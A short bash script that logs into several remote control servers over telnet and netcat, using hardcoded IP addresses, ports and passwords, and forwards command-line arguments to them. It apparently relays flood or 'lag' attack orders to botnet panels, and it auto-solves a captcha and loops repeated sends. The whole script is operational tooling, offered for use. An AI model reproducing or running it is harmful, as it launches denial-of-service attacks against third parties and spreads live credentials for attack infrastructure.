#!/usr/bin/env bash
user="err"
function backup1() {
  echo
  sleep 2
  cropped1=$(cat check.txt | grep "Solve: " | tail -1 | cut -c 7-)
  cropped=$(echo $cropped1 | sed 's/[\n\r]//g' | sed 's/\x1b\[[0-9;]*m//g')
  answer=`expr $cropped`
  echo $answer
  sleep 1
  echo 1
  sleep 1
  echo "trap"
  sleep 0.5
  echo FDL5sii234WOPOfp
  sleep 0.5
  echo y
  sleep 2
  echo $1 $2 $3 $4 $5 $6 $7
  sleep 1
  echo exit
}
function telnetSend() {
  echo
  sleep 1
  echo $user
  echo hahafuckyou166
  sleep 5
  echo $1 $2 $3 $4 $5 $6 $7
  sleep 1
  echo exit
}
function rawSend() {
  cat <(echo login; echo traps; echo ho2es;echo $@) - | nc 46.4.152.170 911 &
  ncpid=$!
  sleep 1
  kill -SIGINT $ncpid
  sudo pkill nc
}
function lag() {
  echo $$ > /root/bot/users/$1.pid
  i=1
  while [[ $i -le $6 ]]
  do
  telnetSend $2 $3 $4 $7 | telnet 185.239.242.83 34241
  echo  $1
  sleep $4
  let "i=i+1"
  done
  rm -rf /root/bot/users/$1.pid
  sleep 3
}
if [[ $1 = "kraken" ]]; then
  user="skid"
elif [[ $1 = "godzilla" ]]; then
  user="godzilla"
elif [[ $1 = "spongebob" ]]; then
  user="sponge"
elif [[ $1 = "backup1" ]]; then
  user="couch2"
  backup1 $2 $3 $4 $5 $6 $7 $8 | telnet 167.114.53.152 65535 | tee check.txt
  exit 1
elif [[ $1 = "lag" ]]; then
  user="kraken"
  lag
else
  echo "err"
  exit 1
fi
telnetSend $2 $3 $4 $5 $6 $7 $8 | telnet 185.239.242.86 6281
